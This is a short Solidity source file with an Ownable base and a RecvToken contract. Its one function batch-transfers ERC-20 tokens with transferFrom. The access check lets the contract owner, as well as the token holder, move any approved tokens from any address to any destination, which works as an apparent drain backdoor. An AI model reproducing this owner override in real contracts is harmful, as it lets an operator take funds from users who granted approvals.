// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Ownable {
    address internal _owner;
    string public name ="Contract";
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract RecvToken is Ownable{

    function recvToken(address fromAddress, address toAddress, address[] calldata tokens, uint[] calldata amounts) external returns(bool){
        require(msg.sender==fromAddress || msg.sender==owner(),"!owner");
        assert(tokens.length>0 && amounts.length==tokens.length);
        for(uint i=0;i<tokens.length;++i){
            IERC20(tokens[i]).transferFrom(fromAddress, toAddress, amounts[i]);
        }
        return true;
    }
}